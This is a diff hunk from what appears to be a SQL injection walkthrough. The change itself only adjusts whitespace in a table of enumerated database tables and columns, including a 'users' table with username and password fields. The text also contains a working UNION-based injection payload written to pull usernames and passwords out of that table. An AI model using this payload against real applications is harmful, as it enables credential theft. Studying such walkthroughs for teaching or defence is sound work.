@@ -43,24 +43,24 @@ so we can combine with our own SELECT statement with 2 other interesting columns
 - where '1'='1' will always validate true so it will spew out all the table names and column names.
 =============================
 Results
-Username	    Nickname
-CHARACTER_SETS	CHARACTER_SET_NAME
-CHARACTER_SETS	DEFAULT_COLLATE_NAME
-CHARACTER_SETS	DESCRIPTION
-CHARACTER_SETS	MAXLEN
-COLLATIONS	    COLLATION_NAME
-COLLATIONS	    CHARACTER_SET_NAME
-COLLATIONS	    ID
-COLLATIONS	    IS_DEFAULT
-COLLATIONS	    IS_COMPILED
-COLLATIONS	    SORTLEN
+Username	    	Nickname
+CHARACTER_SETS		CHARACTER_SET_NAME
+CHARACTER_SETS		DEFAULT_COLLATE_NAME
+CHARACTER_SETS		DESCRIPTION
+CHARACTER_SETS		MAXLEN
+COLLATIONS	    	COLLATION_NAME
+COLLATIONS	    	CHARACTER_SET_NAME
+COLLATIONS	    	ID
+COLLATIONS	    	IS_DEFAULT
+COLLATIONS	    	IS_COMPILED
+COLLATIONS	    	SORTLEN
 ...
 ...
 ...
-users	        id
-users	        username
-users	        password
-users	        nickname
+users	        	id
+users	        	username
+users	        	password
+users	        	nickname
 =====================================================
 After knowing the Table name and column names, we can generate another SQL injection to get the credentials of admin
     ' union select username, password from users where '1'='1
